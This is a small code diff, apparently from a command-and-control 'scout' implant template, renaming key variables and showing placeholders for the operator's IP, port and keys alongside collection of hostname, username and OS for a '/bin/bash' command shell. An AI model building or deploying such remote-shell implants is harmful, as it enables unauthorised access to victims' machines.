@@ -6,9 +6,9 @@ from datetime import datetime
 
 port = !!!!!
 ip_addr = @@@@@
-server_key = #####
+lkey = #####
 End = $$$$$
-sid = %%%%%
+skey = %%%%%
 time_to_sleep = ^^^^^
 type_of_scout = 'Command Shell'
 try:
@@ -24,7 +24,7 @@ try:
 except:
     username = '?????'
 userinfo = hostname + '/' + username
-scout_data = [sid, server_key, userinfo, type_of_scout, operating_sys]
+scout_data = [skey, lkey, userinfo, type_of_scout, operating_sys]
 shell_type = '/bin/bash'
 s = None
 
